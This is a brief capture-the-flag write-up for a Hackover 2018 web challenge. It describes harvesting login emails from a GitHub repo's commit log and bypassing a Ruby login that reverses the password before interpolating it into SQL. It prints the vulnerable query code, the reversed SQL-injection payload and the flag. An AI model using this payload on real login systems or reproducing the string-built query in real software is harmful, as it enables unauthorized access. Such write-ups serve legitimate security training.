## title
#### challenge
```
Howdy mate! Just login and hand out the flag, aye! You can find on h18johndoe has all you need!

http://yo-know-john-dow.ctf.hackover.de:4567/login

alternative: 46.101.157.142:4567/login
```
## resources
[github](https://github.com/h18johndoe/user_repository/blob/master/user_repo.rb)

### idea
The web page needs an email to login, therefore we cloned the github-repo and looked at the commits with ```git log``` and checked the four emails on the website login.
```
commit b26aed283d56c65845b02957a11d90bc091ac35a (HEAD -> master, origin/master, origin/HEAD)
Author: John Doe <angelo_muh@yahoo.org>
Date:   Tue Oct 2 23:55:57 2018 +0200

    Add login method

commit 5383fb4179f1aec972c5f2cc956a0fee07af353a
Author: John Doe <jamez@hemail.com>
Date:   Tue Oct 2 23:04:13 2018 +0200

    Add methods

commit 2d3e1dc0c5712efd9a0c7a13d2f0a8faaf51153c
Author: John Doe <john_doe@gmail.com>
Date:   Tue Oct 2 23:02:26 2018 +0200

    Add dependency injection for database

commit 3ec70acbf846037458c93e8d0cb79a6daac98515
Author: John Doe <john_doe@notes.h18>
Date:   Tue Oct 2 23:01:30 2018 +0200

    Add user repo class and file
```
john_doe@notes.h18 worked.

The login function in the ruby script is vulnerable to SQL-Injections through the reversed password.
We used ```-- '1'='1' ro '1``` as password and got the flag.
```
  def login(identification, password)
    hashed_input_password = hash(password)
    query = "select id, phone, email from users where email = '#{identification}' and password_digest = '#{hashed_input_password}' limit 1"
    puts "SQL executing: '#{query}'"
    @database[query].first if user_exists?(identification)
  end
```
```
  def hash(password)
    password.reverse
  end
```

### flag
hackover18{I_KN0W_H4W_70_STALK_2018}
